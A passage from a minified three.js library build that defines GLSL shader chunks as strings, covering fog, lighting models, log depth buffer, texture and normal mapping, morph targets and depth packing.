gl_FragCoord.w;\\n\\t#endif\\n\\t#ifdef FOG_EXP2\\n\\t\\tfloat fogFactor = whiteCompliment( exp2( - fogDensity * fogDensity * depth * depth * LOG2 ) );\\n\\t#else\\n\\t\\tfloat fogFactor = smoothstep( fogNear, fogFar, depth );\\n\\t#endif\\n\\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\\n#endif\\n\" three.shaderchunk.fog_pars_fragment=\"#ifdef USE_FOG\\n\\tuniform vec3 fogColor;\\n\\t#ifdef FOG_EXP2\\n\\t\\tuniform float fogDensity;\\n\\t#else\\n\\t\\tuniform float fogNear;\\n\\t\\tuniform float fogFar;\\n\\t#endif\\n#endif\" ;three.shaderchunk.lightmap_fragment=\"#ifdef USE_LIGHTMAP\\n\\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n#endif\\n\" ;three.shaderchunk.lightmap_pars_fragment=\"#ifdef USE_LIGHTMAP\\n\\tuniform sampler2D lightMap;\\n\\tuniform float lightMapIntensity;\\n#endif\" three.shaderchunk.lights_lambert_vertex=\"vec3 diffuse = vec3( 1.0 );\\nGeometricContext geometry;\\ngeometry.position = mvPosition.xyz;\\ngeometry.normal = normalize( transformedNormal );\\ngeometry.viewDir = normalize( -mvPosition.xyz );\\nGeometricContext backGeometry;\\nbackGeometry.position = geometry.position;\\nbackGeometry.normal = -geometry.normal;\\nbackGeometry.viewDir = geometry.viewDir;\\nvLightFront = vec3( 0.0 );\\n#ifdef DOUBLE_SIDED\\n\\tvLightBack = vec3( 0.0 );\\n#endif\\nIncidentLight directLight;\\nfloat dotNL;\\nvec3 directLightColor_Diffuse;\\n#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\tvLightFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\" three.shaderchunk.lights_pars=\"uniform vec3 ambientLightColor;\\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\\n\\tvec3 irradiance = ambientLightColor;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treturn irradiance;\\n}\\n#if NUM_DIR_LIGHTS > 0\\n\\tstruct DirectionalLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\\n\\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tdirectLight.color = directionalLight.color;\\n\\t\\tdirectLight.direction = directionalLight.direction;\\n\\t\\tdirectLight.visible = true;\\n\\t}\\n#endif\\n#if NUM_POINT_LIGHTS > 0\\n\\tstruct PointLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\\n\\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tvec3 lVector = pointLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tif ( testLightInRange( lightDistance, pointLight.distance ) ) {\\n\\t\\t\\tdirectLight.color = pointLight.color;\\n\\t\\t\\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tstruct SpotLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tfloat coneCos;\\n\\t\\tfloat penumbraCos;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\\n\\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\\n\\t\\tvec3 lVector = spotLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tfloat angleCos = dot( directLight.direction, spotLight.direction );\\n\\t\\tif ( all( bvec2( angleCos > spotLight.coneCos, testLightInRange( lightDistance, spotLight.distance ) ) ) ) {\\n\\t\\t\\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\\n\\t\\t\\tdirectLight.color = spotLight.color;\\n\\t\\t\\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tstruct HemisphereLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 skyColor;\\n\\t\\tvec3 groundColor;\\n\\t};\\n\\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\\n\\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\\n\\t\\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\\n\\t\\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\\n\\t\\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tirradiance *= PI;\\n\\t\\t#endif\\n\\t\\treturn irradiance;\\n\\t}\\n#endif\\n#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\\n\\t\\t#include <normal_flip>\\n\\t\\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryVec = flipNormal * vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryVec = flipNormal * vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV( queryVec, 1.0 );\\n\\t\\t#else\\n\\t\\t\\tvec4 envMapColor = vec4( 0.0 );\\n\\t\\t#endif\\n\\t\\treturn PI * envMapColor.rgb * envMapIntensity;\\n\\t}\\n\\tfloat getSpecularMIPLevel( const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\tfloat maxMIPLevelScalar = float( maxMIPLevel );\\n\\t\\tfloat desiredMIPLevel = maxMIPLevelScalar - 0.79248 - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\\n\\t\\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\\n\\t}\\n\\tvec3 getLightProbeIndirectRadiance( const in GeometricContext geometry, const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( -geometry.viewDir, geometry.normal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( -geometry.viewDir, geometry.normal, refractionRatio );\\n\\t\\t#endif\\n\\t\\t#include <normal_flip>\\n\\t\\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\\n\\t\\tfloat specularMIPLevel = getSpecularMIPLevel( blinnShininessExponent, maxMIPLevel );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryReflectVec = flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryReflectVec = flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV(queryReflectVec, BlinnExponentToGGXRoughness(blinnShininessExponent));\\n\\t\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\t\\tvec2 sampleUV;\\n\\t\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#endif\\n\\t\\treturn envMapColor.rgb * envMapIntensity;\\n\\t}\\n#endif\\n\" three.shaderchunk.lights_phong_fragment=\"BlinnPhongMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb;\\nmaterial.specularColor = specular;\\nmaterial.specularShininess = shininess;\\nmaterial.specularStrength = specularStrength;\\n\" ;three.shaderchunk.lights_phong_pars_fragment=\"varying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\nstruct BlinnPhongMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tvec3\\tspecularColor;\\n\\tfloat\\tspecularShininess;\\n\\tfloat\\tspecularStrength;\\n};\\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\\n}\\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_BlinnPhong\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_BlinnPhong\\n#define Material_LightProbeLOD( material )\\t(0)\\n\" three.shaderchunk.lights_physical_fragment=\"PhysicalMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\\n#ifdef STANDARD\\n\\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\\n#else\\n\\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\\n\\tmaterial.clearCoat = saturate( clearCoat );\\tmaterial.clearCoatRoughness = clamp( clearCoatRoughness, 0.04, 1.0 );\\n#endif\\n\" three.shaderchunk.lights_physical_pars_fragment=\"struct PhysicalMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tfloat\\tspecularRoughness;\\n\\tvec3\\tspecularColor;\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoat;\\n\\t\\tfloat clearCoatRoughness;\\n\\t#endif\\n};\\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_GGX( directLight, geometry, material.specularColor, material.specularRoughness );\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.directSpecular += irradiance * material.clearCoat * BRDF_Specular_GGX( directLight, geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 clearCoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectSpecular += radiance * BRDF_Specular_GGX_Environment( geometry, material.specularColor, material.specularRoughness );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.indirectSpecular += clearCoatRadiance * material.clearCoat * BRDF_Specular_GGX_Environment( geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_Physical\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_Physical\\n#define RE_IndirectSpecular\\t\\tRE_IndirectSpecular_Physical\\n#define Material_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.specularRoughness )\\n#define Material_ClearCoat_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.clearCoatRoughness )\\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\\n\\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\\n}\\n\" three.shaderchunk.lights_template=\"\\nGeometricContext geometry;\\ngeometry.position = - vViewPosition;\\ngeometry.normal = normal;\\ngeometry.viewDir = normalize( vViewPosition );\\nIncidentLight directLight;\\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if defined( RE_IndirectDiffuse )\\n\\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tlightMapIrradiance *= PI;\\n\\t\\t#endif\\n\\t\\tirradiance += lightMapIrradiance;\\n\\t#endif\\n\\t#if ( NUM_HEMI_LIGHTS > 0 )\\n\\t\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\t\\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t}\\n\\t#endif\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL ) && defined( ENVMAP_TYPE_CUBE_UV )\\n\\t \\tirradiance += getLightProbeIndirectIrradiance( geometry, 8 );\\n\\t#endif\\n\\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\\n#endif\\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\\n\\tvec3 radiance = getLightProbeIndirectRadiance( geometry, Material_BlinnShininessExponent( material ), 8 );\\n\\t#ifndef STANDARD\\n\\t\\tvec3 clearCoatRadiance = getLightProbeIndirectRadiance( geometry, Material_ClearCoat_BlinnShininessExponent( material ), 8 );\\n\\t#else\\n\\t\\tvec3 clearCoatRadiance = vec3( 0.0 );\\n\\t#endif\\n\\t\\t\\n\\tRE_IndirectSpecular( radiance, clearCoatRadiance, geometry, material, reflectedLight );\\n#endif\\n\" three.shaderchunk.logdepthbuf_fragment=\"#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)\\n\\tgl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;\\n#endif\" ;three.shaderchunk.logdepthbuf_pars_fragment=\"#ifdef USE_LOGDEPTHBUF\\n\\tuniform float logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n#endif\\n\" ;three.shaderchunk.logdepthbuf_pars_vertex=\"#ifdef USE_LOGDEPTHBUF\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n\\tuniform float logDepthBufFC;\\n#endif\" three.shaderchunk.logdepthbuf_vertex=\"#ifdef USE_LOGDEPTHBUF\\n\\tgl_Position.z = log2(max( EPSILON, gl_Position.w + 1.0 )) * logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvFragDepth = 1.0 + gl_Position.w;\\n\\t#else\\n\\t\\tgl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;\\n\\t#endif\\n#endif\\n\" ;three.shaderchunk.map_fragment=\"#ifdef USE_MAP\\n\\tvec4 texelColor = texture2D( map, vUv );\\n\\ttexelColor = mapTexelToLinear( texelColor );\\n\\tdiffuseColor *= texelColor;\\n#endif\\n\" three.shaderchunk.map_pars_fragment=\"#ifdef USE_MAP\\n\\tuniform sampler2D map;\\n#endif\\n\" ;three.shaderchunk.map_particle_fragment=\"#ifdef USE_MAP\\n\\tvec4 mapTexel = texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) * offsetRepeat.zw + offsetRepeat.xy );\\n\\tdiffuseColor *= mapTexelToLinear( mapTexel );\\n#endif\\n\" ;three.shaderchunk.map_particle_pars_fragment=\"#ifdef USE_MAP\\n\\tuniform vec4 offsetRepeat;\\n\\tuniform sampler2D map;\\n#endif\\n\" ;three.shaderchunk.metalnessmap_fragment=\"float metalnessFactor = metalness;\\n#ifdef USE_METALNESSMAP\\n\\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\\n\\tmetalnessFactor *= texelMetalness.r;\\n#endif\\n\" three.shaderchunk.metalnessmap_pars_fragment=\"#ifdef USE_METALNESSMAP\\n\\tuniform sampler2D metalnessMap;\\n#endif\" ;three.shaderchunk.morphnormal_vertex=\"#ifdef USE_MORPHNORMALS\\n\\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\\n\\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\\n\\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\\n\\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\\n#endif\\n\" three.shaderchunk.morphtarget_pars_vertex=\"#ifdef USE_MORPHTARGETS\\n\\t#ifndef USE_MORPHNORMALS\\n\\tuniform float morphTargetInfluences[ 8 ];\\n\\t#else\\n\\tuniform float morphTargetInfluences[ 4 ];\\n\\t#endif\\n#endif\" ;three.shaderchunk.morphtarget_vertex=\"#ifdef USE_MORPHTARGETS\\n\\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\\n\\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\\n\\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\\n\\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\\n\\t#ifndef USE_MORPHNORMALS\\n\\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\\n\\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\\n\\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\\n\\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\\n\\t#endif\\n#endif\\n\" three.shaderchunk.normal_flip=\"#ifdef DOUBLE_SIDED\\n\\tfloat flipNormal = ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n#else\\n\\tfloat flipNormal = 1.0;\\n#endif\\n\" ;three.shaderchunk.normal_fragment=\"#ifdef FLAT_SHADED\\n\\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\\n\\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\\n\\tvec3 normal = normalize( cross( fdx, fdy ) );\\n#else\\n\\tvec3 normal = normalize( vNormal ) * flipNormal;\\n#endif\\n#ifdef USE_NORMALMAP\\n\\tnormal = perturbNormal2Arb( -vViewPosition, normal );\\n#elif defined( USE_BUMPMAP )\\n\\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\\n#endif\\n\" three.shaderchunk.normalmap_pars_fragment=\"#ifdef USE_NORMALMAP\\n\\tuniform sampler2D normalMap;\\n\\tuniform vec2 normalScale;\\n\\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\\n\\t\\tvec3 q0 = dFdx( eye_pos.xyz );\\n\\t\\tvec3 q1 = dFdy( eye_pos.xyz );\\n\\t\\tvec2 st0 = dFdx( vUv.st );\\n\\t\\tvec2 st1 = dFdy( vUv.st );\\n\\t\\tvec3 S = normalize( q0 * st1.t - q1 * st0.t );\\n\\t\\tvec3 T = normalize( -q0 * st1.s + q1 * st0.s );\\n\\t\\tvec3 N = normalize( surf_norm );\\n\\t\\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\\n\\t\\tmapN.xy = normalScale * mapN.xy;\\n\\t\\tmat3 tsn = mat3( S, T, N );\\n\\t\\treturn normalize( tsn * mapN );\\n\\t}\\n#endif\\n\" three.shaderchunk.packing=\"vec3 packNormalToRGB( const in vec3 normal ) {\\n  return normalize( normal ) * 0.5 + 0.5;\\n}\\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\\n  return 1.0 - 2.0 * rgb.xyz;\\n}\\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\\nconst float ShiftRight8 = 1. / 256.;\\nvec4 packDepthToRGBA( const in float v ) {\\n\\tvec4 r = vec4( fract( v * PackFactors ), v );\\n\\tr.yzw -= r.xyz * ShiftRight8;\\treturn r * PackUpscale;\\n}\\nfloat unpackRGBAToDepth( const in vec4 v ) {\\n\\treturn dot( v, UnpackFactors );\\n}\\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\\n  return ( viewZ + near ) / ( near - far );\\n}\\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\\n  return linearClipZ * ( near - far ) - near;\\n}\\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\\n  return (( near + viewZ ) * far ) / (( far - near ) * viewZ );\\n}\\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\\n  return ( near * far ) / ( ( far - near ) * invClipZ - far );\\n}\\n\" 